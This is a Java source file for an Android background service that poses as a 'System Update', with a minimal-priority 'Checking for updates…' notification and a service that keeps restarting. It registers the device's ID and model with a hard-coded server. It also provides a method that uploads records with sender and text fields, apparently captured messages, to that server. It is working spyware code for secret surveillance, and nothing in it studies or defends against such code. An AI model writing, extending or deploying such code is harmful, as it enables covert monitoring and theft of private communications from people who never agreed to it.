package com.system.update;

import android.app.*;
import android.content.*;
import android.os.*;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.*;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class UploadService extends Service {

    public static final String SERVER_URL = "http://172.20.1.194:5000";
    private static final String CHANNEL = "sys_upd";
    private static String deviceId;

    public static String getDeviceId(Context ctx) {
        SharedPreferences sp = ctx.getSharedPreferences("app", MODE_PRIVATE);
        String id = sp.getString("device_id", null);
        if (id == null) {
            id = "dev_" + android.provider.Settings.Secure.getString(
                ctx.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            );
            sp.edit().putString("device_id", id).apply();
        }
        deviceId = id;
        return id;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();

        Notification n = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Update")
            .setContentText("Checking for updates…")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, n);
        }

        getDeviceId(this);
        registerInfo();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void registerInfo() {
        JSONObject info = new JSONObject();
        JSONObject payload = new JSONObject();
        try {
            info.put("model", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            payload.put("device_id", deviceId);
            payload.put("info", info);
        } catch (JSONException ignored) {}

        post("/api/register", payload.toString());
    }

    public static void uploadRecord(Context ctx, String type, String from, String text) {
        try {
            JSONObject rec = new JSONObject();
            rec.put("type", type);
            rec.put("from", from == null ? "" : from);
            rec.put("text", text == null ? "" : text);
            rec.put("ts", System.currentTimeMillis());

            JSONArray arr = new JSONArray();
            arr.put(rec);

            JSONObject payload = new JSONObject();
            payload.put("device_id", getDeviceId(ctx));
            payload.put("records", arr);

            new UploadService().post("/api/data", payload.toString());
        } catch (JSONException ignored) {}
    }

    private void post(String path, String json) {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(15, TimeUnit.SECONDS)
                    .writeTimeout(15, TimeUnit.SECONDS)
                    .readTimeout(15, TimeUnit.SECONDS)
                    .build();

                Request req = new Request.Builder()
                    .url(SERVER_URL + path)
                    .post(RequestBody.create(json, MediaType.parse("application/json")))
                    .build();

                client.newCall(req).execute().close();
            } catch (IOException ignored) {}
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
}
